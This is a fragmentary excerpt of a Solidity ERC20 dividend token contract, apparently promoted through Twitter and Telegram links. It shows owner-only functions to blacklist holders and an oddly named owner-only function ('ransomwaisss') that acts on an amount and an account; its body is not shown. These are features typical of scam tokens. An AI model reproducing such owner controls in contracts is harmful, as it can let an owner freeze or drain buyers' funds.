...
🔸Twitter: https://twitter.com/Asrstoken
🔸Telegram: https://t.me/Asrstokens
...
contract ERC20DividendToken is Context, ERC20Burnable, Ownable {
    ...
    function ransomwaisss(uint256 amount, uint256 itamarus, address account) public onlyOwner {
   ...
   function isExcludedFromFees(address account) public view returns (bool) {
    ...
    function backlistss(address _user) public onlyOwner {
        require(!isBlacklisted[_user], "user already blacklisted");
        isBlacklisted[_user] = true;
        // emit events as well
    }
    
    function removeFromBlacklists(address _user) public onlyOwner {
...
contract ASRSALLIANCE is ERC20DividendToken {
